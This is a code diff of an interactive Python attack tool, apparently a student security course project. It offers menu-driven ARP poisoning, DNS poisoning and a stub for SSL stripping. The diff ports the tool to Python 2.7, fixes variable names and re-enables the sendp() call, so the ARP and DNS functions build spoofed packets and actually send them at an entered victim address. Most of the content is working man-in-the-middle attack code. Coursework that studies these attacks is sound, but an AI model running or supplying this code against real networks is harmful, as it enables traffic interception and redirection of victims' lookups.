@@ -18,6 +18,13 @@ IP_VICTIMS = []
 MAC_VICTIMS = []
 
 
+# Python 2.7... :(
+try:
+    input = raw_input
+except NameError:
+    pass
+
+
 # Set up argument parser for using arguments in the command line
 parser = argparse.ArgumentParser(
     prog='2IC80 tool',
@@ -35,14 +42,14 @@ def ARPposioning():
         ipVictim= input("Enter IP address of victim: ")
         macVictim= getmacbyip(ipVictim)
 
-        IPS_VICTIMS.append(ipVictim)
-        MACS_VICTIMS.append(macVictim)
+        IP_VICTIMS.append(ipVictim)
+        MAC_VICTIMS.append(macVictim)
 
         ipToSpoof= input("Enter IP address to spoof: ")
         print(ipVictim)
         arp=Ether() / ARP()
-        arp[Ether].src= macAttacker
-        arp[ARP].hwsrc= macAttacker
+        arp[Ether].src= MAC_ATTACKER
+        arp[ARP].hwsrc= MAC_ATTACKER
         arp[ARP].psrc= ipToSpoof
         arp[ARP].hwdst= macVictim
         arp[ARP].pdst= ipVictim
@@ -65,8 +72,8 @@ def ARPposioning():
 
                 print(ipVictim)
                 arp=Ether() / ARP()
-                arp[Ether].src= macAttacker
-                arp[ARP].hwsrc= macAttacker
+                arp[Ether].src= MAC_ATTACKER
+                arp[ARP].hwsrc= MAC_ATTACKER
                 arp[ARP].psrc= ipToSpoof
                 arp[ARP].hwdst= macVictim
                 arp[ARP].pdst= ipVictim
@@ -76,8 +83,9 @@ def ARPposioning():
         print("\n\n")
     
 
-    # sendp(arp, iface=INTERFACE_NAME)
-    print(f'{bcolors.OKCYAN}{ATTACKS["a"]}{bcolors.ENDC} has been executed (packet has been succesfully sent)\n')
+    sendp(arp, iface=INTERFACE_NAME)
+    print('{cyan}{attack}{endc} has been executed (packet has been succesfully sent)\n'.format(cyan=bcolors.OKCYAN, attack=ATTACKS["a"], endc=bcolors.ENDC))
+    
 
 def DNSpoisoning():
     dns_ip = ''
@@ -91,7 +99,7 @@ def DNSpoisoning():
         if dns_domain_valid:
             dns_domain = dns_domain_input
         else:
-            print(f'{bcolors.WARNING}Please enter a valid domain (format: www.example.com){bcolors.ENDC}')
+            print('{warning}Please enter a valid domain (format: www.example.com){endc}'.format(warning=bcolors.WARNING, endc=bcolors.ENDC))
 
 
     # Ask for an IP address until a valid one is provided
@@ -102,7 +110,7 @@ def DNSpoisoning():
         if len(dns_ip_parsed) == 1:
             dns_ip = dns_ip_parsed[0]
         else:
-            print(f'{bcolors.WARNING}Please fill in a single valid IP address, not a range or list.{bcolors.ENDC}\n')
+            print('{warning}Please fill in a single valid IP address, not a range or list.{endc}'.format(warning=bcolors.WARNING, endc=bcolors.ENDC))
 
     # Assumption: ARP poisoning has been applied to make the victim think the attacker is the router (where the DNS lookup message will be sent)
     # The data below is assumed from that ARP poisoning attack
@@ -126,37 +134,42 @@ def DNSpoisoning():
         # Send the DNS packet
         sendp(dns, iface=INTERFACE_NAME)
 
-    print(f'\n{bcolors.OKCYAN}{ATTACKS["b"]}{bcolors.ENDC} has been executed (sent a packet to victim resolving {bcolors.OKCYAN}{dns_domain}{bcolors.ENDC} to {bcolors.OKCYAN}{dns_ip}{bcolors.ENDC})\n')
+    print('\n{cyan}{attack}{endc} has been executed (sent a packet to victim resolving {cyan}{domain}{endc} to {cyan}{ip}{endc})\n'.format(cyan=bcolors.OKCYAN, attack=ATTACKS['b'], endc=bcolors.ENDC, domain=dns_domain, ip=dns_ip))
 
 def SSLstripping():
-    print(f'SSL stripping selected.\n')
+    print('SSL stripping selected.\n')
 
 
 def main():
     clear()
     print('2IC80: Tool by G44')
     while True:
-        print(f'Select the preferred attack from the list below:\n')
+        print('Select the preferred attack from the list below:\n')
         
-        # Render options
-        for key in ATTACKS:
-            print(f'    {bcolors.OKCYAN}{key}{bcolors.ENDC}) {ATTACKS[key]}')
-        print(f'    {bcolors.OKCYAN}d{bcolors.ENDC}) Exit\n')
+        print('    {cyan}a{endc}) {attack}'.format(cyan=bcolors.OKCYAN, attack=ATTACKS['a'], endc=bcolors.ENDC))
+        print('    {cyan}b{endc}) {attack}'.format(cyan=bcolors.OKCYAN, attack=ATTACKS['b'], endc=bcolors.ENDC))
+        print('    {cyan}c{endc}) {attack}'.format(cyan=bcolors.OKCYAN, attack=ATTACKS['c'], endc=bcolors.ENDC))
+        print('    {cyan}d{endc}) Exit\n'.format(cyan=bcolors.OKCYAN, endc=bcolors.ENDC))
 
-        name = input(f'\nYour choice: {bcolors.OKCYAN}')
-        print(f'{bcolors.ENDC}\n')
-        print(f'You have selected {bcolors.OKCYAN}{ATTACKS[name] if name in ATTACKS else name}{bcolors.ENDC}.\n')
+        choice = input('\nYour choice: ' + bcolors.OKCYAN)
+        print(bcolors.ENDC + '\n')
+        selectedName = choice
+        if choice in ATTACKS:
+            selectedName = ATTACKS[choice]
+        elif choice == 'd':
+            selectedName = 'Exit'
+        print('You have selected {cyan}{name}{endc}. \n'.format(cyan=bcolors.OKCYAN, name=selectedName, endc=bcolors.ENDC))
 
-        if name == 'd':
+        if choice == 'd':
             break
-        elif name == 'a':
+        elif choice == 'a':
             ARPposioning()
-        elif name == 'b':
+        elif choice == 'b':
             DNSpoisoning()
-        elif name == 'c':
+        elif choice == 'c':
             SSLstripping()
         else:
-            print(f'Invalid input. Please try again.\n')
+            print('Invalid input. Please try again.\n')
 
 
 # Entry point: This part runs when the tool is called from the command line using `python tool.py`. The if-statement is not required, but good practice.
